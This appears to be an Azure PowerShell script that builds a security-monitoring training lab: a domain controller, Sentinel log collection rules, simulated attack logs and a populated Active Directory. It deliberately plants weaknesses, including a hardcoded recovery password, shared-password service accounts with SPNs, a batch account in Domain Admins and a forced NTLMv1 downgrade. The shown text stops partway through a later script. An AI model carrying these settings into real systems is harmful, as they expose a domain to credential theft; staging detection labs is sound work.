param (
    [string]$adminAccount,
    [string]$adminPassword,
    [string]$LDAPUserAccount1,
    [string]$LDAPUserAccount2
)

Import-Module Az.Compute
Import-Module Az.Accounts
Import-Module Az.Monitor

Connect-AzAccount -Identity


$resourceGroupName = "ITOperations"
$DCvmName = "DC"


# PowerShell Script to Run
$script = @"
# Ensure the required Windows feature is installed
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

# Import the ADDSDeployment module
Import-Module ADDSDeployment

# Define domain configuration
`$domainName = "odomain.local"
`$safeModePassword = ConvertTo-SecureString "P@ssw0rd123" -AsPlainText -Force # Set a strong password for Directory Services Restore Mode (DSRM)

# Promote the VM to a Domain Controller
Install-ADDSForest -DomainName `$domainName -SafeModeAdministratorPassword `$safeModePassword -Force
"@

# Invoke Run Command
Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName $DCvmName -CommandId "RunPowerShellScript" -ScriptString $script



#Scheduling autolog generator on bastion-gw01
$bastionName = "bastion-gw01"

$BastionSimScript = @"
import os
import time
from random import choice, randint

# Map numeric severity levels to syslog priority names
SEVERITY_MAP = {
    0: "emerg",
    1: "alert",
    2: "crit",
    3: "err",
    4: "warning",
    5: "notice",
    6: "info",
    7: "debug"
}

def log_cef_message(severity, signature_id, name, extensions):
    """Helper function to log CEF-compliant messages using logger."""
    base_cef = f"CEF:0|Linux|SecurityMonitoring|1.0|{signature_id}|{name}|{severity}|"
    extension_str = " ".join([f"{key}={value}" for key, value in extensions.items()])
    cef_message = f"{base_cef}{extension_str}"
    
    # Map severity to a valid syslog priority name
    severity_name = SEVERITY_MAP.get(severity, "info")  # Default to "info" if unknown
    os.system(f"logger -p auth.{severity_name} '{cef_message}'")
    print(cef_message)

def generate_failed_ssh_logins():
    users = ["root", "admin", "user1", "contractor"]
    ip_addresses = ["192.168.1.10", "203.0.113.5", "10.0.0.25"]
    for _ in range(5):
        user = choice(users)
        ip = choice(ip_addresses)
        extensions = {
            "duser": user,
            "src": ip,
            "dst": "10.0.0.11",
            "spt": 22,
            "msg": f"Failed password for {user}"
        }
        log_cef_message(5, "1001", "Failed SSH login", extensions)
        time.sleep(randint(1, 10))

def generate_specific_failed_logons():
    accounts = ["candice.kevin", "da-batch"]
    source_ip = "10.0.0.10"
    for _ in range(3):
        user = choice(accounts)
        extensions = {
            "duser": user,
            "src": source_ip,
            "dst": "10.0.0.1",
            "spt": 22,
            "msg": f"Failed password for {user}"
        }
        log_cef_message(5, "1002", "Failed SSH login (non-existent user)", extensions)
        time.sleep(randint(1, 10))

def generate_successful_logins():
    users = ["root", "admin", "user1"]
    ip_addresses = ["192.168.1.10", "203.0.113.5", "10.0.0.25"]
    for _ in range(4):
        user = choice(users)
        ip = choice(ip_addresses)
        extensions = {
            "duser": user,
            "src": ip,
            "dst": "10.0.0.11",
            "spt": 22,
            "msg": f"Accepted password for {user}"
        }
        log_cef_message(6, "1003", "Successful SSH login", extensions)
        time.sleep(randint(1, 10))

def generate_privilege_escalation_logs():
    users = ["admin", "devops", "security_user"]
    for _ in range(3):
        user = choice(users)
        extensions = {
            "duser": user,
            "msg": f"User {user} attempted to execute 'sudo su' command"
        }
        log_cef_message(3, "1004", "Privilege escalation attempt", extensions)
        time.sleep(randint(1, 10))

def generate_system_alerts():
    extensions = {
        "msg": "Disk space usage exceeded threshold: /dev/sda1 at 95%",
        "disk": "/dev/sda1",
        "usage": "95%"
    }
    log_cef_message(2, "1005", "Critical system alert", extensions)
    time.sleep(randint(1, 10))

if __name__ == "__main__":
    print("Generating CEF-compliant security monitoring logs for Bastion Gateway...")
    generate_failed_ssh_logins()
    generate_specific_failed_logons()
    generate_successful_logins()
    generate_privilege_escalation_logs()
    generate_system_alerts()
"@

# Bash command to create and run the Python script
$BastionCommand = @"
#!/bin/bash
cat << 'EOF' > /tmp/simscript.py
$BastionSimScript
EOF
(crontab -l; echo "*/2 * * * * python3 /tmp/simscript.py >> /tmp/runlog.log 2>&1") | crontab -
"@


# Execute the command on the Linux VM
Write-Output "Executing script on the Linux VM bastion-gw01..."
try {
    $result = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName `
                                    -VMName $bastionName `
                                    -CommandId "RunShellScript" `
                                    -ScriptString $BastionCommand

    if ($result) {
        Write-Output "Command executed successfully. Output:"
        $result.Value[0].Message | Write-Output
    } else {
        Write-Output "Command execution failed or returned no output."
    }
} catch {
    Write-Error "Failed to execute command: $_"
}



# Start DCR onboarding


# Variables
$resourceGroupName = "CyberSOC"
$workspaceName = "CyberSOCWS"
$dcrName = "Minimal-Servers"
$powershellDcrName = "PowerShellLogs"
$linuxDcrName = "Minimal-Linux"
$DCDcrName = "Additional-DC"

# Get the resource group location
$resourceGroup = Get-AzResourceGroup -Name $resourceGroupName
if (!$resourceGroup) {
    Write-Output "Resource group '$resourceGroupName' not found." -ForegroundColor Red
    exit
}

$location = $resourceGroup.Location

# Retrieve the Log Analytics Workspace details
$workspace = Get-AzOperationalInsightsWorkspace -ResourceGroupName $resourceGroupName -Name $workspaceName
if (!$workspace) {
    Write-Output "Log Analytics Workspace '$workspaceName' not found in Resource Group '$resourceGroupName'" -ForegroundColor Red
    exit
}

# Prepare DCR details
$workspaceResourceId = $workspace.ResourceId
$workspaceId = $workspace.CustomerId
#$subscriptionId=(Get-AzContext).Subscription.Id

# Define the DCR object
# Construct JSON as a raw string
# Construct JSON as a raw string (without apiVersion)
$jsonContent = @"
{
    "kind": "Windows",
    "location": "$location",
    "tags": {
        "createdBy": "Sentinel"
    },
    "properties": {
        "dataSources": {
            "windowsEventLogs": [
                {
                    "streams": [
                        "Microsoft-SecurityEvent"
                    ],
                    "xPathQueries": [
                        "Security!*[System[(EventID=1102) or (EventID=4624) or (EventID=4625) or (EventID=4657) or (EventID=4663) or (EventID=4688) or (EventID=4700) or (EventID=4702) or (EventID=4719) or (EventID=4720) or (EventID=4722) or (EventID=4723) or (EventID=4724) or (EventID=4727) or (EventID=4728)]]",
                        "Security!*[System[(EventID=4732) or (EventID=4735) or (EventID=4737) or (EventID=4739) or (EventID=4740) or (EventID=4754) or (EventID=4755) or (EventID=4756) or (EventID=4767) or (EventID=4799) or (EventID=4825) or (EventID=4946) or (EventID=4948) or (EventID=4956) or (EventID=5024)]]",
                        "Security!*[System[(EventID=5033) or (EventID=8222)]]",
                        "Security!*[System[(EventID=4674) or (EventID=4678)]]",
                        "System!*[System[(EventID=7036)]]",
                        "Microsoft-Windows-AppLocker/EXE and DLL!*[System[(EventID=8001) or (EventID=8002) or (EventID=8003) or (EventID=8004)]]",
                        "Microsoft-Windows-AppLocker/MSI and Script!*[System[(EventID=8005) or (EventID=8006) or (EventID=8007)]]"
                    ],
                    "name": "eventLogsDataSource"
                }
            ]
        },
        "destinations": {
            "logAnalytics": [
                {
                    "workspaceResourceId": "$workspaceResourceId",
                    "workspaceId": "$workspaceId",
                    "name": "DataCollectionEvent"
                }
            ]
        },
        "dataFlows": [
            {
                "streams": [
                    "Microsoft-SecurityEvent"
                ],
                "destinations": [
                    "DataCollectionEvent"
                ]
            }
        ]
    }
}
"@

# Define the JSON content 
$powershellDCRJsonContent = @"
{
    "kind": "Windows",
    "location": "$location",
    "tags": {
        "createdBy": "Sentinel"
    },
    "properties": {
        "dataSources": {
            "windowsEventLogs": [
                {
                    "streams": [
                        "Microsoft-SecurityEvent"
                    ],
                    "xPathQueries": [
                        "Microsoft-Windows-PowerShell/Operational!*[System[(EventID=4104)]]"
                    ],
                    "name": "eventLogsDataSource"
                }
            ]
        },
        "destinations": {
            "logAnalytics": [
                {
                    "workspaceResourceId": "$workspaceResourceId",
                    "workspaceId": "$workspaceId",
                    "name": "DataCollectionEvent"
                }
            ]
        },
        "dataFlows": [
            {
                "streams": [
                    "Microsoft-SecurityEvent"
                ],
                "destinations": [
                    "DataCollectionEvent"
                ]
            }
        ]
    }
}
"@

$linuxJsonContent = @"
{
    "kind": "Linux",
    "location": "$location",
    "tags": {
        "createdBy": "Sentinel"
    },
    "properties": {
        "dataSources": {
            "syslog": [
                {
                    "streams": [
                        "Microsoft-CommonSecurityLog"
                    ],
                    "facilityNames": [
                        "alert",
                        "audit",
                        "auth",
                        "authpriv",
                        "cron",
                        "daemon",
                        "local0",
                        "local1",
                        "local7"
                    ],
                    "logLevels": [
                        "Info",
                        "Notice",
                        "Warning",
                        "Error",
                        "Critical",
                        "Alert",
                        "Emergency"
                    ],
                    "name": "sysLogsDataSource-1"
                },
                {
                    "streams": [
                        "Microsoft-CommonSecurityLog"
                    ],
                    "facilityNames": [
                        "nopri"
                    ],
                    "logLevels": [
                        "Emergency"
                    ],
                    "name": "sysLogsDataSource-2"
                }
            ]
        },
        "destinations": {
            "logAnalytics": [
                {
                    "workspaceResourceId": "$workspaceResourceId",
                    "workspaceId": "$workspaceId",
                    "name": "DataCollectionEvent"
                }
            ]
        },
        "dataFlows": [
            {
                "streams": [
                    "Microsoft-CommonSecurityLog"
                ],
                "destinations": [
                    "DataCollectionEvent"
                ]
            }
        ]
    }
}
"@


$dcJsonContent= @"
{
    "kind": "Windows",
    "location": "$location",
    "tags": {
        "createdBy": "Sentinel"
    },
    "properties": {
        "dataSources": {
            "windowsEventLogs": [
                {
                    "streams": [
                        "Microsoft-SecurityEvent"
                    ],
                    "xPathQueries": [
                        "Security!*[System[(EventID=4769 or EventID=4773 or EventID=4627)]]",
                        "Directory Service!*[System[(EventID=2889 or EventID=2887)]]"
                    ],
                    "name": "eventLogsDataSource"
                }
            ]
        },
        "destinations": {
            "logAnalytics": [
                {
                    "workspaceResourceId": "$workspaceResourceId",
                    "workspaceId": "$workspaceId",
                    "name": "DataCollectionEvent"
                }
            ]
        },
        "dataFlows": [
            {
                "streams": [
                    "Microsoft-SecurityEvent"
                ],
                "destinations": [
                    "DataCollectionEvent"
                ]
            }
        ]
    }
}
"@


# Create the Data Collection Rule using the JSON string 
New-AzDataCollectionRule -Name $dcrName -ResourceGroupName $resourceGroupName -JsonString $jsonContent

# Add DCR association to VMs
$vmNames = @("mserv", "win10", "dc")

# Retrieve the ImmutableId for the DCR
$dcr = Get-AzDataCollectionRule -ResourceGroupName $resourceGroupName -Name $dcrName
if (!$dcr) {
    Write-Output "DCR '$dcrName' not found in Resource Group '$resourceGroupName'." -ForegroundColor Red
    exit
}

$dataCollectionRuleId = $dcr.Id
$resourceGroupNameOps = "ITOperations"

# Add DCR association to VMs
foreach ($vmName in $vmNames) {
    $vm = Get-AzVM -ResourceGroupName $resourceGroupNameOps -Name $vmName
    if (!$vm) {
        Write-Output "VM '$vmName' not found in Resource Group '$resourceGroupNameOps'." 
        continue
    }

    # Build the association
    $targetResourceId = $vm.Id
    $associationName = "$vmName-DCR-Association"

    # Create DCR association
    New-AzDataCollectionRuleAssociation -TargetResourceId $targetResourceId `
        -DataCollectionRuleId $dataCollectionRuleId `
        -AssociationName $associationName

    Write-Output "DCR Association '$associationName' created for VM '$vmName' using Id."
}


# Windows 10 Powershell DCR
New-AzDataCollectionRule -Name $powershellDcrName -ResourceGroupName $resourceGroupName -JsonString $powershellDCRJsonContent
$win10name="win10"


# Retrieve the ImmutableId for the DCR
$powershellDCR = Get-AzDataCollectionRule -ResourceGroupName $resourceGroupName -Name $powershellDcrName
if (!$powershellDCR) {
    Write-Output "DCR '$powershellDcrName' not found in Resource Group '$resourceGroupName'." 
}

$powershellDataCollectionRuleId = $powershellDCR.Id


# Add Powershell DCR association to Win10 VMs
$win10 = Get-AzVM -ResourceGroupName $resourceGroupNameOps -Name $win10name
if (!$win10) {
    Write-Output "VM '$win10name' not found in Resource Group '$resourceGroupNameOps'." 
}

# Build the association
$targetWin10ResourceId = $win10.Id
$Win10PowershellassociationName = "Powershell-win10-DCR-Association"
# Create DCR association
New-AzDataCollectionRuleAssociation -TargetResourceId $targetWin10ResourceId -DataCollectionRuleId $powershellDataCollectionRuleId -AssociationName $Win10PowershellassociationName

Write-Output "DCR Association '$Win10PowershellassociationName' created for VM '$win10name' using Id." 




# -----------------------------------------
# - Deploy Azure Monitor Agent to the VMs -
# -----------------------------------------
foreach ($vmName in $vmNames) {
    # Enable the Azure Monitor extension
    $extension = Set-AzVMExtension -ResourceGroupName $resourceGroupNameOps `
        -VMName $vmName `
        -Name "AzureMonitorWindowsAgent" `
        -Publisher "Microsoft.Azure.Monitor" `
        -ExtensionType "AzureMonitorWindowsAgent" `
        -TypeHandlerVersion "1.0" `
        -Location $location

    Write-Output "Azure Monitor Agent deployed for VM '$vmName'." 
}



# -----------------------------------------
# ----    Linux DCR part      -------------
# -----------------------------------------

New-AzDataCollectionRule -Name $linuxDcrName -ResourceGroupName $resourceGroupName -JsonString $linuxJsonContent

# Add DCR association to VMs
$web01Name = "web01"


# Retrieve the ImmutableId for the DCR
$linuxDcr = Get-AzDataCollectionRule -ResourceGroupName $resourceGroupName -Name $linuxDcrName
if (!$linuxDcr) {
    Write-Output "DCR '$linuxDcrName' not found in Resource Group '$resourceGroupName'." 
}

$linuxDataCollectionRuleId = $linuxDcr.Id


# Add DCR association to VMs
$web01 = Get-AzVM -ResourceGroupName $resourceGroupNameOps -Name $web01Name
if (!$web01) {
    Write-Output "VM '$web01Name' not found in Resource Group '$resourceGroupNameOps'." 
}

# Build the association
$targetLinuxResourceId = $web01.Id
$LinuxassociationName = "web01-DCR-Association"
# Create DCR association
New-AzDataCollectionRuleAssociation -TargetResourceId $targetLinuxResourceId -DataCollectionRuleId $linuxDataCollectionRuleId -AssociationName $LinuxassociationName
Write-Output "DCR Association '$LinuxassociationName' created for VM '$web01Name' using Id." 


# Deploy Azure Monitor Agent to the Linux VM
$extension = Set-AzVMExtension -ResourceGroupName $resourceGroupNameOps -VMName $web01Name -Name "AzureMonitorLinuxAgent" -Publisher "Microsoft.Azure.Monitor"     -ExtensionType "AzureMonitorLinuxAgent"     -TypeHandlerVersion "1.0"     -Location $location
Write-Output "Azure Monitor Agent deployed for VM '$web01Name'." 



# Join machines to domain


$resourceGroupName = "ITOperations"
$domainName = "odomain.local"
$domainAdminUser = $adminAccount
$domainAdminPassword = $adminPassword

# List of VM names to join to the domain
$vmNames = @("mserv", "win10")

# PowerShell Script for Domain Join
$domainJoinScript = @"
# Securely store domain admin credentials
`$securePassword = ConvertTo-SecureString '$domainAdminPassword' -AsPlainText -Force
`$credential = New-Object System.Management.Automation.PSCredential('$domainAdminUser', `$securePassword)

# Join the server to the domain
Add-Computer -DomainName '$domainName' -Credential `$credential -Restart -Force
"@

# Function to invoke domain join with retry logic
Function Invoke-DomainJoinWithRetry {
    param(
        [string]$ResourceGroupName,
        [string]$VMName,
        [string]$Script,
        [int]$MaxAttempts = 10,
        [int]$WaitTime = 120  # Wait time in seconds (2 minutes)
    )

    $attempt = 1
    $success = $false

    while ($attempt -le $MaxAttempts -and -not $success) {
        Write-Output "Attempt $attempt to join $VMName to the domain..."

        try {
            $result = Invoke-AzVMRunCommand -ResourceGroupName $ResourceGroupName -VMName $VMName `
                -CommandId "RunPowerShellScript" -ScriptString $Script -ErrorAction Stop

            # Check if there is an error message in StdErr
            $errorMessage = $result.Value[1].Message
            if (![string]::IsNullOrEmpty($errorMessage)) {
                # An error occurred
                Write-Output "Error occurred: $errorMessage"
                if ($attempt -lt $MaxAttempts) {
                    Write-Output "Waiting for 2 minutes before retrying..."
                    Start-Sleep -Seconds $WaitTime
                } else {
                    Write-Output "Maximum attempts reached. Could not join $VMName to the domain."
                }
            } else {
                # No error message, assume success
                Write-Output "$VMName successfully joined to the domain."
                $success = $true
            }
        } catch {
            # Handle any exceptions from Invoke-AzVMRunCommand
            Write-Output "An error occurred while executing the command: $_"
            if ($attempt -lt $MaxAttempts) {
                Write-Output "Waiting for 2 minutes before retrying..."
                Start-Sleep -Seconds $WaitTime
            } else {
                Write-Output "Maximum attempts reached. Could not join $VMName to the domain."
            }
        }

        $attempt++
    }
}

# Invoke Run Command to Join the Domain with retry logic for each VM
foreach ($vmName in $vmNames) {
    Invoke-DomainJoinWithRetry -ResourceGroupName $resourceGroupName -VMName $vmName -Script $domainJoinScript
}

# Post-reboot Script to Configure DNS Forwarders
$dnsForwarderScript = @"
# Ensure DNS Server module is available
Import-Module DNSServer

# Add a forwarder to Google Public DNS
Add-DnsServerForwarder -IPAddress "8.8.8.8"
"@

# Run the DNS forwarder configuration script on the DC VM
Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName $DCvmName -CommandId "RunPowerShellScript" -ScriptString $dnsForwarderScript



# Populate AD

$ADOnjectsCreationScript = @"
param (
    [string]`$pwd
)

# Import the Active Directory module
Import-Module ActiveDirectory


# Define global variables
`$OUs = @(
    'Corp',
    'Corp/Servers',
    'Corp/Desktops',
    'Corp/Users',
    'Corp/ServiceAccounts',
    'Corp/Groups',
    'Corp/Admins'
)
`$ServiceAccounts = @('svc-mssql', 'svc-sap', 'svc-riot', 'svc-backup', 'svc-web', 'svc-file', 'svc-email', 'svc-dns', 'svc-print', 'svc-api',
                     'svc-data', 'svc-monitor', 'svc-report', 'svc-backup2', 'svc-web2', 'svc-file2', 'svc-email2', 'svc-dns2', 'svc-print2', 'svc-api2')
`$SecurityGroups = @('Finance', 'Accounting', 'Marketing', 'Sales', 'Support', 'IT', 'Logistics', 'R&D', 'Operations', 'Engineering',
                    'Legal', 'Compliance', 'Procurement', 'Admin', 'Training', 'Quality', 'CustomerService', 'Analytics', 'Risk',
                    'Governance', 'Security', 'Innovation', 'Planning', 'Product')
`$AdditionalGroups = @('ITSupport', 'HR')
`$JobTitles = @('Software Engineer', 'Data Analyst', 'System Administrator', 'Network Engineer', 'Project Manager', 'HR Specialist',
               'Finance Manager', 'Marketing Coordinator', 'Sales Representative', 'Business Analyst', 'Compliance Officer', 'Support Specialist',
               'Quality Assurance Analyst', 'Product Manager', 'Operations Lead', 'Training Coordinator', 'Customer Service Rep', 'Logistics Manager',
               'Security Analyst', 'Procurement Specialist')
`$UserAccounts = @('Alice Johnson', 'Bob Smith', 'Charlie Brown', 'Diana Prince', 'Eve Adams', 'Frank Castle', 'Grace Hopper', 'Hank Pym', 'Ivy Bell', 'Jack Reacher',
                  'Karen Miller', 'Leo Tolstoy', 'Maya Angelou', 'Neil Armstrong', 'Olivia Wilde', 'Paul Atreides', 'Quincy Jones', 'Rose Tyler', 'Sam Wilson', 'Tina Turner',
                  'Uma Thurman', 'Victor Hugo', 'Wendy Darling', 'Xander Harris', 'Yara Greyjoy', 'Support Support')
`$CandiceKevin = @{'Name' = 'Candice Kevin'; 'SamAccountName' = 'candice.kevin'; 'Title' = 'HR Executive'}
`$JonSmith = @{'Name' = 'Jon Smith'; 'SamAccountName' = 'jon'}
`$BatchAccount = @{'Name' = 'DA Batch'; 'SamAccountName' = 'da-batch'}
`$ComputerAccounts = @('appsrv01', 'appsrv02', 'db001', 'db002', 'sap01', 'sap02', 'web01', 'web02', 'print01', 'print02',
                      'backup01', 'backup02', 'email01', 'email02', 'dns01', 'dns02', 'file01', 'file02', 'app03', 'db003',
                      'web03', 'web04', 'sap03', 'sap04', 'file03')

# Get the domain components dynamically
`$domainDN = (Get-ADDomain).DistinguishedName
`$domainDNS = (Get-ADDomain).DNSRoot

# Create OUs
foreach (`$ou in `$OUs) {
    # Split the OU path to extract the current OU name and parent OU path
    `$parts = `$ou -split '/'
    `$currentOU = `$parts[-1]
    `$parentOU = if (`$parts.Length -gt 1) { "OU=`$(`$parts[-2])" } else { "" } # Handle root-level OUs

    # Construct the full SearchBase path dynamically
    `$searchBase = if (`$parentOU -ne "") { "`$parentOU,`$domainDN" } else { `$domainDN }

    # Check if the OU already exists
    `$existingOU = Get-ADOrganizationalUnit -Filter "Name -eq '`$currentOU'" -SearchBase `$searchBase -ErrorAction SilentlyContinue
    if (-not `$existingOU) {
        # Construct the New-ADOrganizationalUnit path dynamically
        `$ouPath = if (`$parentOU -ne "") { "`$parentOU,`$domainDN" } else { `$domainDN }
        New-ADOrganizationalUnit -Name `$currentOU -Path `$ouPath 
        Write-Host "OU `$ou created"
    }
}



# Create service accounts with SPNs in ServiceAccounts OU
foreach (`$account in `$ServiceAccounts) {
    New-ADUser -Name `$account -SamAccountName `$account -AccountPassword (ConvertTo-SecureString "`$pwd" -AsPlainText -Force) -Enabled `$true -Path "OU=ServiceAccounts,OU=Corp,`$domainDN" 
    Write-Output "User `$account created in ServiceAccounts OU"

    `$serviceType = `$account -replace '^svc-', ''
    `$serverName = "`$serviceType-server01.`$domainDNS"
    Set-ADUser -Identity `$account -ServicePrincipalNames @{Add="`$account/`$serverName"} 
    Write-Output "SPN `$account/`$serverName assigned"
}

# Create global security groups in Groups OU
foreach (`$group in `$SecurityGroups + `$AdditionalGroups) {
    New-ADGroup -Name `$group -GroupScope Global -Path "OU=Groups,OU=Corp,`$domainDN" 
    Write-Output "Group `$group created in Groups OU"
}

# Create user accounts with random job titles in Users OU
foreach (`$user in `$UserAccounts) {
    `$firstName, `$lastName = `$user -split ' '
    `$samAccountName = (`$firstName.Substring(0, 1) + `$lastName).ToLower()
    `$randomTitle = Get-Random -InputObject `$JobTitles
    New-ADUser -Name `$user -SamAccountName `$samAccountName -UserPrincipalName "`$samAccountName@`$domainDNS" -AccountPassword (ConvertTo-SecureString "`$pwd" -AsPlainText -Force) -Enabled `$true -Title `$randomTitle -Path "OU=Users,OU=Corp,`$domainDN" 
    Write-Output "User `$user created with job title `$randomTitle in Users OU"
}

# Create specific accounts in Admins OU
New-ADUser -Name `$CandiceKevin.Name -SamAccountName `$CandiceKevin.SamAccountName -UserPrincipalName "`$(`$CandiceKevin.SamAccountName)@`$domainDNS" -AccountPassword (ConvertTo-SecureString "`$pwd" -AsPlainText -Force) -Enabled `$true -Title `$CandiceKevin.Title -Path "OU=Users,OU=Corp,`$domainDN"
Write-Output "User `$(`$CandiceKevin.Name) created in Admins OU"
Add-ADGroupMember -Identity 'HR' -Members `$CandiceKevin.SamAccountName 
Write-Output "User `$(`$CandiceKevin.Name) added to group HR"

New-ADUser -Name `$JonSmith.Name -SamAccountName `$JonSmith.SamAccountName -UserPrincipalName "`$(`$JonSmith.SamAccountName)@`$domainDNS" -AccountPassword (ConvertTo-SecureString "`$pwd" -AsPlainText -Force) -Enabled `$true -Path "OU=Admins,OU=Corp,`$domainDN" 
Write-Output "User `$(`$JonSmith.Name) created in Admins OU"
Add-ADGroupMember -Identity 'ITSupport' -Members `$JonSmith.SamAccountName 
Write-Output "User `$(`$JonSmith.Name) added to group ITSupport"

New-ADUser -Name `$BatchAccount.Name -SamAccountName `$BatchAccount.SamAccountName -UserPrincipalName "`$(`$BatchAccount.SamAccountName)@`$domainDNS" -AccountPassword (ConvertTo-SecureString "`$pwd" -AsPlainText -Force) -Enabled `$true -Path "OU=Admins,OU=Corp,`$domainDN" 
Write-Output "User `$(`$BatchAccount.Name) created in Admins OU"
Add-ADGroupMember -Identity 'Domain Admins' -Members `$BatchAccount.SamAccountName 
Write-Output "User `$(`$BatchAccount.Name) added to group Domain Admins"

# Create computer accounts in Servers OU
foreach (`$computer in `$ComputerAccounts) {
    New-ADComputer -Name `$computer -Path "OU=Servers,OU=Corp,`$domainDN" 
    Write-Output "Computer `$computer created in Servers OU"
}

Write-Output "Active Directory environment setup with OU structure completed successfully."
"@


# Run object creation script on the DC VM
$output = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName $DCvmName -CommandId "RunPowerShellScript" -ScriptString $ADOnjectsCreationScript -Parameter @{"pwd" = $adminPassword}

# View the full output of provisioning
$output.Value | ForEach-Object { $_.Message }


#Add DCRs to DC

# Create the Data Collection Rule using the JSON string 
New-AzDataCollectionRule -Name $DCDcrName -ResourceGroupName $resourceGroupName -JsonString $dcJsonContent


# Retrieve the ImmutableId for the DCR
$DCdcr = Get-AzDataCollectionRule -ResourceGroupName $resourceGroupName -Name $DCDcrName
if (!$DCdcr) {
    Write-Output "DCR '$DCDcrName' not found in Resource Group '$resourceGroupName'." 
    exit
}

$dataCollectionRuleId = $DCdcr.Id
$resourceGroupNameOps = "ITOperations"

# Add DCR association to VMs
$DCvm = Get-AzVM -ResourceGroupName $resourceGroupNameOps -Name $DCvmName
if (!$DCvm) {
    Write-Output "VM '$DCvmName' not found in Resource Group '$resourceGroupNameOps'." 
}

# Build the association
$targetResourceId = $DCvm.Id
$associationName = "$DCvmName-DCR-Association-addt"

    # Create DCR association
New-AzDataCollectionRuleAssociation -TargetResourceId $targetResourceId `
    -DataCollectionRuleId $dataCollectionRuleId `
    -AssociationName $associationName

Write-Output "DCR Association '$associationName' created for VM '$DCvmName' using Id."

$extension = Set-AzVMExtension -ResourceGroupName $resourceGroupNameOps `
        -VMName $DCvmName `
        -Name "AzureMonitorWindowsAgent" `
        -Publisher "Microsoft.Azure.Monitor" `
        -ExtensionType "AzureMonitorWindowsAgent" `
        -TypeHandlerVersion "1.0" `
        -Location $location

Write-Output "Azure Monitor Agent deployed for VM '$DCvmName'." 

$EnableAuditScriptString = @"
Write-Output "Enabling LDAP Diagnostics Settings..."
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics" -Name "16 LDAP Interface Events" -Value 2 -Type DWord

Write-Output "LDAP Diagnostics successfully configured."

# Configure Advanced Audit Policies for specific subcategories
# auditpol /get /category:*

Write-Output "Setting Advanced Audit Policies..."

# Logon/Logoff
& auditpol.exe /set /subcategory:"Logon" /success:enable /failure:enable
& auditpol.exe /set /subcategory:"Logoff" /success:disable
& auditpol.exe /set /subcategory:"Special Logon" /success:enable /failure:enable

# Detailed tracking
& auditpol.exe /set /subcategory:"Process Creation" /success:enable /failure:enable

# Privilege use
& auditpol.exe /set /subcategory:"Sensitive Privilege Use" /success:enable /failure:enable

# Account Logon
& auditpol.exe /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
& auditpol.exe /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
& auditpol.exe /set /subcategory:"Credential Validation" /success:enable
& auditpol.exe /set /subcategory:"Group Membership" /success:enable /failure:enable

# Account Management
& auditpol.exe /set /subcategory:"Computer Account Management" /success:enable
& auditpol.exe /set /subcategory:"Security Group Management" /success:enable
& auditpol.exe /set /subcategory:"User Account Management" /success:enable

# DS Access
& auditpol.exe /set /subcategory:"Directory Service Access" /success:enable /failure:enable

Write-Output "Advanced Audit Policies successfully configured."


# Define the folder path and share name
`$FolderPath = "C:\HealthReports"
`$ShareName = "HealthReports"
`$Description = "Shared folder for health reports"

# Create the folder if it doesn't exist
if (-Not (Test-Path `$FolderPath)) {
    New-Item -ItemType Directory -Path `$FolderPath
    Write-Output "Folder '`$FolderPath' created."
} else {
    Write-Output "Folder '`$FolderPath' already exists."
}

# Set NTFS permissions: Add "Everyone" with read access
`$Acl = Get-Acl `$FolderPath
`$AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow")
`$Acl.SetAccessRule(`$AccessRule)
Set-Acl -Path `$FolderPath -AclObject `$Acl
Write-Output "NTFS permissions for 'Everyone' set to 'Read'."

# Create the network share
`$ShareParams = @{
    Name        = `$ShareName
    Path        = `$FolderPath
    Description = `$Description
}
New-SmbShare @ShareParams -FullAccess "Administrator" -ReadAccess "Everyone"
Write-Output "Share '`$ShareName' created and shared with 'Everyone' for read access."

"@
# Enable LDAP Audit on DC VM
$output = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName $DCvmName -CommandId "RunPowerShellScript" -ScriptString $EnableAuditScriptString 

# View the full output
$output.Value | ForEach-Object { $_.Message }



#Downgrade to NTLM and access DC file share under an account with NTLM
$mservscript = @"
# Enable File and Printer sharing
netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=Yes
# Add ssupport to local admins
net localgroup Administrators "ODOMAIN\ssupport" /add


Write-Output "Setting Advanced Audit Policies..."

# Logon/Logoff
& auditpol.exe /set /subcategory:"Logon" /success:enable /failure:enable
& auditpol.exe /set /subcategory:"Logoff" /success:disable
& auditpol.exe /set /subcategory:"Special Logon" /success:enable /failure:enable

# Detailed tracking
& auditpol.exe /set /subcategory:"Process Creation" /success:enable /failure:enable

# Privilege use
& auditpol.exe /set /subcategory:"Sensitive Privilege Use" /success:enable /failure:enable

`$regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
`$regValue = "LmCompatibilityLevel"

# Set the desired level
Set-ItemProperty -Path `$regPath -Name `$regValue -Value 1
Write-Output "LAN Manager Authentication Level downgraded to NTLMv1 successfully."

`$FileSharePath = "\\10.0.0.4\HealthReports"
`$securePassword = ConvertTo-SecureString "$adminPassword" -AsPlainText -Force
`$Credential = New-Object System.Management.Automation.PSCredential ("odomain\da-batch", `$securePassword)

# Directly access the file share with the specified credentials
`$session = New-PSDrive -Name TempShare -PSProvider FileSystem -Root `$FileSharePath -Credential `$Credential
try {
    Get-ChildItem -Path "TempShare:\"
} finally {
    Remove-PSDrive -Name TempShare
}

#Start-Process powershell.exe -Credential `$Credential -ArgumentList "-Command Get-ChildItem -Path `$FileSharePath; Start-Sleep -Seconds 1;Exit"
Write-Output "Accessed a folder under da-batch account, with downgraded NTLM."
"@
# Connect with NTLMv1
$output = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName "mserv" -CommandId "RunPowerShellScript" -ScriptString $mservscript 

# View the full output
$output.Value | ForEach-Object { $_.Message }



## Logon users to win10, setting audit
$w10script = @"
Write-Output "Setting Advanced Audit Policies..."
# Logon/Logoff
& auditpol.exe /set /subcategory:"Logon" /success:enable /failure:enable
& auditpol.exe /set /subcategory:"Logoff" /success:disable
& auditpol.exe /set /subcategory:"Special Logon" /success:enable /failure:enable

# Detailed tracking
